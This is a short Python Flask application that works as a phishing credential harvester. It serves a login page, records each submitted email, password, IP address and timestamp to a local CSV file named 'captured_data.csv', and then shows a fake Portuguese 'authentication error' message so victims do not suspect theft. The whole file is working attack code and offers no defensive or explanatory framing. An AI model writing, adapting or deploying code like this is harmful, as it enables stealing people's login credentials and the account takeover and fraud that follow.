from flask import Flask, render_template, request, redirect
import csv 
from datetime import datetime

app = Flask(__name__)

@app.route("/")
def login_page():
    return render_template("login.html")

@app.route("/login", methods=["POST"])
def capture_data():
    email = request.form.get("email")
    password = request.form.get("password")
    user_ip = request.remote_addr
    timestramp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    with open("captured_data.csv", mode="a", newline="") as file:
        writer = csv.writer(file)
        writer.writerow([email, password, user_ip, timestramp])
    
    return redirect("/unauthorized")

@app.route("/unauthorized")
def unauthorized():
    return"<h2>Erro de autenticação. Tente novamente mais tarde.</h2"

if __name__ == "__main__":
    app.run(debug=True)